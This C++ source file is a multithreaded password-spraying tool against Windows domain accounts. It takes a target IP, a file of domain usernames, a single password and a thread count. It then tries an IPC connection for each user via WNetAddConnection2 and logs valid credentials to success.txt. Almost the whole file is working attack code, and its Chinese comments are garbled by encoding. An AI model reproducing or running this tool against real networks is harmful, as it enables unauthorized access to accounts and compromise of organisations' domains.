// ���EnuDomainUserö�ٳ��������û��б���б���
#pragma once
#ifndef UNICODE
#define UNICODE
#endif
#define _CRT_SECURE_NO_WARNINGS				// ���԰�ȫ������

#include "WNetApi.h"
#include "CommonApi.h"
#include "tou.h"
#include "queue"

#define BUFFSIZE 1024

// ȫ�ֱ���
WNetApi theWNetApi;
CommonApi theCommonApi;
std::mutex mtx;		// �߳���
HANDLE hSuccessFile = theCommonApi.CreateFileApi(L"success.txt");		// ���������ļ�
std::queue<std::wstring> domainUsersQueue;		// ������û����Ķ���

void start(int i, LPWSTR lpRemoteName, LPWSTR lpDomainUserPassword) {

	std::wstring domainUserName;
	LPCWSTR lpDomainUserName;

	while (!domainUsersQueue.empty())
	{
		if (mtx.try_lock())
		{
			domainUserName = domainUsersQueue.front();		// ��ȡ��һ������
			domainUsersQueue.pop();							// ɾ����һ������
		}
		mtx.unlock();
		lpDomainUserName = domainUserName.data();
		// wprintf(L"[#%d] %s\n", i, lpDomainUserName);

		if (theWNetApi.WNetAddConnection2Api(lpRemoteName, (LPWSTR)lpDomainUserName, lpDomainUserPassword) == 1)		// ����������Ϊ�û���
		{
			theWNetApi.WNetCancelConnection2Api(lpRemoteName);
			theCommonApi.saveIPCok(hSuccessFile, lpRemoteName, (LPWSTR)lpDomainUserName, lpDomainUserPassword);
		}
		else if (GetLastError() == 1219)
		{
			// ������һ���û�ʹ��һ�������û����������������Դ�Ķ������ӡ��ж���˷�����������Դ���������ӣ�Ȼ������һ�Ρ� 
			wprintf(L"[%s] multiple connections. try again. \n", lpDomainUserName);
			domainUsersQueue.push(domainUserName);			// ��Ҫ���±��ƣ��������������
			Sleep(1000);
		}
		else if (GetLastError() == 1326) {
			// �û��������벻��ȷ�� 
			wprintf(L"[%s] The user name or password is incorrect. \n", lpDomainUserName);
		}
		else
		{
			wprintf(L"[%s] error : %d\n", lpDomainUserName, GetLastError());
		}
		
	}
	
}

int wmain(int argc, wchar_t* argv[])
{
	setlocale(LC_ALL, "");							// ��������
	if (argc != 5) {
		wprintf(L"Usage: %s <domainComputerIp> <domainUser.txt> <password> <t_num>\n", argv[0]);
		wprintf(L"       %s \\\\192.168.52.29 domainUser.txt password 100\n", argv[0]);
		wprintf(L"       %s \\\\�����IP ���û����ֵ� ���Ա��Ƶ����� ���߳���Ŀ\n", argv[0]);
		exit(1);
	}

	LPWSTR lpRemoteName = argv[1];							// \\192.168.52.29
	LPWSTR lpDomainUserFileName = argv[2];					// ���û����ֵ�: domainUser.txt
	LPWSTR lpDomainUserPassword = argv[3];					// ���û�����: 1qaz@WSX
	std::wstring wszThreadNum = argv[4];							// �߳���Ŀ: 10

	wprintf(L"lpRemoteName: %s\n", lpRemoteName);
	wprintf(L"lpDomainUserFileName: %s\n", lpDomainUserFileName);
	wprintf(L"lpDomainUserPassword: %s\n", lpDomainUserPassword);
	wprintf(L"lpThreadNum: %s\n", wszThreadNum.data());
	wprintf(L"------------------------------------------------------\n");


	int iThreadNum = std::stoi(wszThreadNum.data());

	FILE* pFile;
	CHAR str1[BUFFSIZE];
	LPWSTR str2;

	if ((pFile = fopen(theCommonApi.UnicodeToAnsi(lpDomainUserFileName), "rt")) == NULL)
	{
		printf("���ļ�ʧ��\n");
		exit(0);
	}

	while (fgets(str1, BUFFSIZE, pFile))
	{
		str2 = theCommonApi.AnsiToUnicode(strtok(str1, "\n"));			// ɾ�����з�
		domainUsersQueue.push(str2);
	}

	// �ر��ļ�
	fclose(pFile);
	

	// ���߳�
	std::thread* Threads = new std::thread[iThreadNum];
	for (int i = 0; i < iThreadNum; i++) {
		Threads[i] = std::thread(start, i, lpRemoteName, lpDomainUserPassword);
	}
	for (int i = 0; i < iThreadNum; i++) {
		Threads[i].join();
	}
	delete[] Threads;

	

	return 0;

}